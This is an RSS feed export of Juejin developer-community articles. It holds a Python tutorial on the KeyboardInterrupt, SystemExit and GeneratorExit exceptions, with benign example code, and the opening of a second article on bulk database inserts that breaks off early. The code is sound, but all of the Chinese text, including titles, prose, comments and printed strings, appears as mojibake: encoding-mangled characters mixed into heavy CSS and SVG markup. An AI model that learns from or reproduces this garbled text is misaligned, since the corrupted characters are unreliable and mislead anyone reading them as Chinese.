<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Python ä¸­é™¤ Ecception å¤–çš„ä¸‰ç±»ç³»ç»Ÿå¼‚å¸¸]]></title>    <link>https://juejin.cn/post/7592548677744427054</link>    <guid>https://juejin.cn/post/7592548677744427054</guid>    <pubDate>2026-01-08T03:27:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592548677744427054" data-draft-id="7592816646854049842" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python ä¸­é™¤ Ecception å¤–çš„ä¸‰ç±»ç³»ç»Ÿå¼‚å¸¸"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-08T03:27:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·430351025068"/> <meta itemprop="url" content="https://juejin.cn/user/2578777865980459"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python ä¸­é™¤ Ecception å¤–çš„ä¸‰ç±»ç³»ç»Ÿå¼‚å¸¸
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2578777865980459/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·430351025068
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:27:22.000Z" title="Thu Jan 08 2026 03:27:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>KeyboardInterruptã€SystemExitã€ GeneratorExit</p>
</blockquote>
<h2 data-id="heading-0">1ã€python å†…ç½®çš„å¼‚å¸¸ å±‚æ¬¡ç»“æ„</h2>
<ul>
<li>å››å¤§ç³»ç»Ÿçº§å¼‚å¸¸ (ç›´æ¥ç»§æ‰¿BaseException)
<pre><code class="hljs language-python" lang="python">å¼‚å¸¸ç±»å‹	          è§¦å‘åœºæ™¯	            ä»£ç è®¾è®¡å»ºè®®æ•è·	            åŸå› 
Exception        æ‰€æœ‰å¸¸è§„å¼‚å¸¸çš„çˆ¶ç±»        å…¶å­ç±» âœ… åº”è¯¥	   å¸¸è§„ç¨‹åºé”™è¯¯ï¼Œåº”è¯¥å¤„ç†
KeyboardInterrupt	ç”¨æˆ·æŒ‰ Ctrl+C	        âš ï¸ è°¨æ…	           ä»…ç”¨äºæ¸…ç†èµ„æºï¼Œä¸è¦å®Œå…¨å¿½ç•¥
SystemExit	        sys.exit() è°ƒç”¨	        âŒ ä¸å»ºè®®	      è®©ç¨‹åºæ­£å¸¸é€€å‡ºï¼Œé™¤éæœ‰ç‰¹æ®Šéœ€æ±‚
GeneratorExit	    ç”Ÿæˆå™¨å…³é—­	            âŒ ä¸éœ€è¦	      ç”Ÿæˆå™¨å†…éƒ¨é€šå¸¸ä¸éœ€è¦å¤„ç†
</code></pre>
</li>
</ul>
<h2 data-id="heading-1">2ã€KeyboardInterrupt å¼‚å¸¸æ•è·</h2>
<ul>
<li>æ•è·åå¯ä»¥æ‰§è¡Œæ¸…ç†æ“ä½œï¼Œè€Œä¸æ˜¯ç«‹å³ç»ˆæ­¢ç¨‹åºã€‚</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">try</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æŒ‰Ctrl+Cä¸­æ–­ç¨‹åº..."</span>)
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># æ— é™å¾ªç¯</span>
<span class="hljs-keyword">except</span> KeyboardInterrupt:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\næ•è·åˆ°é”®ç›˜ä¸­æ–­ï¼"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å¯ä»¥ä¼˜é›…åœ°æ¸…ç†èµ„æº..."</span>)

<span class="hljs-comment"># ç”¨æˆ·æŒ‰Ctrl+Cåè¾“å‡ºï¼š</span>
<span class="hljs-comment"># æŒ‰Ctrl+Cä¸­æ–­ç¨‹åº...</span>
<span class="hljs-comment"># æ•è·åˆ°é”®ç›˜ä¸­æ–­ï¼</span>
<span class="hljs-comment"># å¯ä»¥ä¼˜é›…åœ°æ¸…ç†èµ„æº...</span>
</code></pre>
<h2 data-id="heading-2">3ã€SystemExit å¼‚å¸¸æ•è·</h2>
<ul>
<li>æ•è·åç¨‹åºä¸ä¼šé€€å‡ºï¼Œé™¤éå†æ¬¡raiseæˆ–è°ƒç”¨sys.exit()</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sys

<span class="hljs-keyword">try</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ç¨‹åºå³å°†é€€å‡º..."</span>)
    sys.exit(<span class="hljs-number">42</span>)  <span class="hljs-comment"># é€€å‡ºä»£ç 42</span>
<span class="hljs-keyword">except</span> SystemExit <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ•è·åˆ°SystemExitï¼Œé€€å‡ºä»£ç : <span class="hljs-subst">{e.code}</span>"</span>)
    <span class="hljs-comment"># å¯ä»¥é€‰æ‹©é˜»æ­¢é€€å‡º</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ç¨‹åºç»§ç»­è¿è¡Œï¼"</span>)

<span class="hljs-comment"># è¾“å‡ºï¼š</span>
<span class="hljs-comment"># ç¨‹åºå³å°†é€€å‡º...</span>
<span class="hljs-comment"># æ•è·åˆ°SystemExitï¼Œé€€å‡ºä»£ç : 42</span>
<span class="hljs-comment"># ç¨‹åºç»§ç»­è¿è¡Œï¼</span>
</code></pre>
<h2 data-id="heading-3">4ã€GeneratorExit å¼‚å¸¸æ•è·</h2>
<ul>
<li>å½“ç”Ÿæˆå™¨è¢«close()æˆ–åƒåœ¾å›æ”¶æ—¶ï¼Œä¼šåœ¨ç”Ÿæˆå™¨å†…éƒ¨æŠ›å‡ºGeneratorExitã€‚</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_generator</span>():
    <span class="hljs-keyword">try</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"ç”Ÿæˆå™¨å¼€å§‹è¿è¡Œ"</span>)
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
            <span class="hljs-keyword">yield</span> i
    <span class="hljs-keyword">except</span> GeneratorExit:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"ç”Ÿæˆå™¨è¢«å…³é—­ï¼"</span>)
        <span class="hljs-keyword">raise</span>  <span class="hljs-comment"># é‡æ–°æŠ›å‡ºï¼Œæˆ–è€…é€‰æ‹©ä¸æŠ›å‡º</span>

gen = my_generator()
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(gen))  <span class="hljs-comment"># 0</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(gen))  <span class="hljs-comment"># 1</span>
gen.close()       <span class="hljs-comment"># å…³é—­ç”Ÿæˆå™¨</span>

<span class="hljs-comment"># è¾“å‡ºï¼š</span>
<span class="hljs-comment"># ç”Ÿæˆå™¨å¼€å§‹è¿è¡Œ</span>
<span class="hljs-comment"># 0</span>
<span class="hljs-comment"># 1</span>
<span class="hljs-comment"># ç”Ÿæˆå™¨è¢«å…³é—­ï¼</span>
</code></pre>
<h2 data-id="heading-4">5ã€å®é™…æ•è·è¡Œä¸ºå¯¹æ¯”,ä¸€ä¸ªå®Œæ•´ä¾‹å­å±•ç¤ºæ‰€æœ‰å››ç§ï¼š</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">demo_system_exit</span>():
    <span class="hljs-keyword">try</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n=== æµ‹è¯• SystemExit ==="</span>)
        sys.exit(<span class="hljs-number">100</span>)
    <span class="hljs-keyword">except</span> SystemExit <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"âœ“ æ•è·SystemExitï¼Œé€€å‡ºä»£ç : <span class="hljs-subst">{e.code}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"  ç¨‹åºæ²¡æœ‰é€€å‡ºï¼Œç»§ç»­æ‰§è¡Œ..."</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">demo_keyboard_interrupt</span>():
    <span class="hljs-keyword">try</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n=== æµ‹è¯• KeyboardInterrupt ==="</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"  æŒ‰Ctrl+Cä¸­æ–­..."</span>)
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            time.sleep(<span class="hljs-number">0.1</span>)
    <span class="hljs-keyword">except</span> KeyboardInterrupt:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\nâœ“ æ•è·KeyboardInterrupt"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"  ç¨‹åºä¼˜é›…é€€å‡º..."</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">demo_generator_exit</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n=== æµ‹è¯• GeneratorExit ==="</span>)
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">generator</span>():
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):
                <span class="hljs-keyword">yield</span> i
        <span class="hljs-keyword">except</span> GeneratorExit:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"  âœ“ æ•è·GeneratorExit"</span>)
            <span class="hljs-keyword">raise</span>  <span class="hljs-comment"># é‡æ–°æŠ›å‡º</span>
    
    gen = generator()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  ç”Ÿæˆå€¼: <span class="hljs-subst">{<span class="hljs-built_in">next</span>(gen)}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  ç”Ÿæˆå€¼: <span class="hljs-subst">{<span class="hljs-built_in">next</span>(gen)}</span>"</span>)
    gen.close()  <span class="hljs-comment"># è§¦å‘GeneratorExit</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">demo_exception</span>():
    <span class="hljs-keyword">try</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n=== æµ‹è¯• Exception ==="</span>)
        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"æµ‹è¯•é”™è¯¯"</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"âœ“ æ•è·Exceptionå­ç±»: <span class="hljs-subst">{<span class="hljs-built_in">type</span>(e).__name__}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  æ¶ˆæ¯: <span class="hljs-subst">{e}</span>"</span>)

<span class="hljs-comment"># æ‰§è¡Œæ‰€æœ‰æµ‹è¯•</span>
demo_system_exit()
demo_generator_exit()
demo_exception()
<span class="hljs-comment"># demo_keyboard_interrupt()  # éœ€è¦æ‰‹åŠ¨æŒ‰Ctrl+Cæµ‹è¯•</span>
</code></pre>
<ul>
<li>
<p>å¥½çš„å®è·µ</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åœºæ™¯1ï¼šå¤„ç†å¸¸è§„å¼‚å¸¸</span>
<span class="hljs-keyword">try</span>:
    data = risky_operation()
<span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å‚æ•°é”™è¯¯: <span class="hljs-subst">{e}</span>"</span>)
<span class="hljs-keyword">except</span> (IndexError, KeyError) <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è®¿é—®é”™è¯¯: <span class="hljs-subst">{e}</span>"</span>)
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æœªçŸ¥é”™è¯¯: <span class="hljs-subst">{e}</span>"</span>)
    logger.exception(<span class="hljs-string">"å‘ç”Ÿå¼‚å¸¸"</span>)

<span class="hljs-comment"># åœºæ™¯2ï¼šæ•è·KeyboardInterruptè¿›è¡Œæ¸…ç†</span>
<span class="hljs-keyword">try</span>:
    main_loop()
<span class="hljs-keyword">except</span> KeyboardInterrupt:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\næ”¶åˆ°ä¸­æ–­ä¿¡å·..."</span>)
    cleanup_resources()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"èµ„æºæ¸…ç†å®Œæˆï¼Œé€€å‡ºã€‚"</span>)
    sys.exit(<span class="hljs-number">0</span>)  <span class="hljs-comment"># æ˜ç¡®é€€å‡º    </span>
</code></pre>
</li>
<li>
<p>âŒ ä¸å¥½çš„å®è·µ</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è¿‡åº¦æ•è·KeyboardInterrupt</span>
<span class="hljs-keyword">try</span>:
    everything()
<span class="hljs-keyword">except</span> KeyboardInterrupt:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ç”¨æˆ·æƒ³é€€å‡ºï¼Œä½†æˆ‘ä¸è®©ä»–é€€å‡ºï¼"</span>)
    <span class="hljs-comment"># ç»§ç»­è¿è¡Œ... è¿™ä¼šè®©ç”¨æˆ·å›°æƒ‘</span>

<span class="hljs-comment"># æ•è·SystemExité˜»æ­¢ç¨‹åºé€€å‡º</span>
<span class="hljs-keyword">try</span>:
    sys.exit(<span class="hljs-number">1</span>)
<span class="hljs-keyword">except</span> SystemExit:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ç¨‹åºæƒ³é€€å‡ºï¼Œä½†æˆ‘ä¸å…è®¸ï¼"</span>)
    <span class="hljs-comment"># ç»§ç»­è¿è¡Œ... è¿™ä¼šç ´åé€€å‡ºé€»è¾‘</span>
</code></pre>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸš€ æ•°æ®åº“æ’å…¥ 1000 ä¸‡æ•°æ®ï¼Ÿåˆ«å†å‚»å‚»ç”¨ for å¾ªç¯äº†ï¼å®æµ‹ 5 ç§æ–¹å¼æ•ˆç‡å¯¹æ¯”]]></title>    <link>https://juejin.cn/post/7592451588849057811</link>    <guid>https://juejin.cn/post/7592451588849057811</guid>    <pubDate>2026-01-08T03:28:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592451588849057811" data-draft-id="7592524811860901922" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸš€ æ•°æ®åº“æ’å…¥ 1000 ä¸‡æ•°æ®ï¼Ÿåˆ«å†å‚»å‚»ç”¨ for å¾ªç¯äº†ï¼å®æµ‹ 5 ç§æ–¹å¼æ•ˆç‡å¯¹æ¯”"/> <meta itemprop="keywords" content="æ•°æ®åº“,åç«¯"/> <meta itemprop="datePublished" content="2026-01-08T03:28:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="JOEH60"/> <meta itemprop="url" content="https://juejin.cn/user/1750078239803614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸš€ æ•°æ®åº“æ’å…¥ 1000 ä¸‡æ•°æ®ï¼Ÿåˆ«å†å‚»å‚»ç”¨ for å¾ªç¯äº†ï¼å®æµ‹ 5 ç§æ–¹å¼æ•ˆç‡å¯¹æ¯”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1750078239803614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    JOEH60
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:28:00.000Z" title="Thu Jan 08 2026 03:28:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨æ—¥å¸¸çš„åç«¯å¼€å‘ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°æ•°æ®è¿ç§»ã€åˆå§‹åŒ–ã€æˆ–è€…æ—¥å¿—å½’æ¡£ç­‰åœºæ™¯ï¼Œéœ€è¦å‘æ•°æ®åº“ä¸­å¯¼å…¥æµ·é‡æ•°æ®ã€‚</p>
<p>"è€æ¿è®©æˆ‘å¾€æ•°æ®åº“æ’ 1000 ä¸‡æ¡æ•°æ®ï¼Œæˆ‘å†™äº†ä¸ª <code>for</code> å¾ªç¯ï¼Œè·‘äº†ä¸€æ™šä¸Šè¿˜æ²¡è·‘å®Œ..."</p>
